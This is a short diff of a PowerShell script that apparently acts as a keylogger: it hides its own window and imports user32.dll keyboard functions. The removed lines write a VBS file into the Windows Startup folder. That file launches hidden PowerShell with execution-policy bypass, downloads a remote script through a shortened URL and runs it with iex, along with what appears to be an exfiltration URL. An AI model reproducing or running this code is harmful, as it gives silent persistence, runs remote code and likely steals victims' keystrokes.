@@ -21,15 +21,6 @@ else{
     $hwnd = $Proc.MainWindowHandle
     $Type::ShowWindowAsync($hwnd, 0)
 }
-$mkFile = @'
-Set WshShell = WScript.CreateObject("WScript.Shell")
-WScript.Sleep 200
-WshShell.Run "powershell.exe -NoP -Ep Bypass -W H -C $dc='https://t.ly/exQMG'; irm https://is.gd/bw_kl_to_dc | iex", 0, True
-'@
-$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.txt"
-$mkFile | Out-File -FilePath $pth -Force
-Rename-Item -Path $pth -NewName "service.vbs" -Force
-
 # Import DLL Definitions for keyboard inputs
 $API = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
